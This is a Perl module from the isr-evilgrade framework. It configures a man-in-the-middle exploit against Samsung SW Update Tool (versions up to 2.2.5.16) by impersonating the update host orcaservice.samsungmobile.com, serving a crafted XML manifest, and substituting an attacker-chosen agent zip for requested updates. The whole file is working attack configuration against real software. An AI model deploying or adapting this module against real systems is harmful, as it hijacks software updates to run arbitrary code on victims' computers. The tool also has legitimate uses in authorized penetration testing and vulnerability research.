###############
# samsung.pm
#
# Copyright 2010 Francisco Amato
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
#
# isr-evilgrade is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with isr-evilgrade; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#
# '''
##
package modules::samsung;

use strict;
use Data::Dump qw(dump);

my $base = {

    'name'        => 'samsung',
    'version'     => '1.0',
    'appver'      => ' <= Samsung SW Update Tool 2.2.5.16',
    'author'      => ['Francisco Amato <famato +[AT]+ faradaysec.com'],
    'description' => qq{Found By:  Joaquín Rodríguez Varela
                        The Samsung SW Update Tool [1] is a tool that analyzes the system drivers of a computer. You can install relevant software for your computer easier and faster using SW Update.
                        The SW Update program helps you install and update your software and driver easily. Samsung [2] SW Update Tool is prone to a Men in The Middle attack which could result in
                        integrity corruption of the transferred data, information leak and consequently code execution.
                        https://www.coresecurity.com/advisories/samsung-sw-update-tool-mitm},

    'vh'      => '(orcaservice.samsungmobile.com)',
    'request' => [
        {   'req'    => 'dl/bom/MAX6356A04.XML',
            'type'   => 'file',
            'method' => '',
            'bin'    => '0',
            'string' => '',
            'parse'  => '1',
            'file'   => './include/samsung/general.xml',
        },
        {   'req'    => '.zip',
            'type'   => 'agent',
            'method' => '',
            'bin'    => 1,
            'string' => '',
            'parse'  => '0',
            'file'   => ''
        },
    ],

    #Options
    'options' => {
        'agent' => {
            'val'  => './agent/agent.zip',
            'desc' => 'Agent to inject',
        },
        'enable' => {
            'val'  => 1,
            'desc' => 'Status'
        },

    }
};

##########################################################################
# FUNCTION      new
# RECEIVES
# RETURNS
# EXPECTS
# DOES          class's constructor
sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
